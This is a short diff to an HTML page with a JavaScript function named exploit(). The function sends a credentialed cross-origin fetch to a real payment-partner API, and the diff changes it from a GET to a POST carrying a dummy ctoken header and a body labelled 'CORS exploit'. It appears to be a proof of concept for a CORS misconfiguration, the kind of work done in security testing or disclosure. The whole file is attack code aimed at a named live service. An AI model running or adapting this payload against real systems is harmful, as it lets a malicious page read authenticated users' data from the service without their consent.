@@ -12,8 +12,13 @@
     <script>
       function exploit() {
         fetch("https://partner-api.alipayplus.com/api/aplus/applySupport.json", {
-          method: "GET",
-          credentials: "include"
+          method: "POST",
+          credentials: "include",
+          headers: {
+            "Content-Type": "application/json",
+            "ctoken": "dummy"
+          },
+          body: JSON.stringify({ test: "CORS exploit" })
         })
         .then(response => response.text())
         .then(data => {
@@ -26,4 +31,3 @@
     </script>
   </body>
 </html>
-
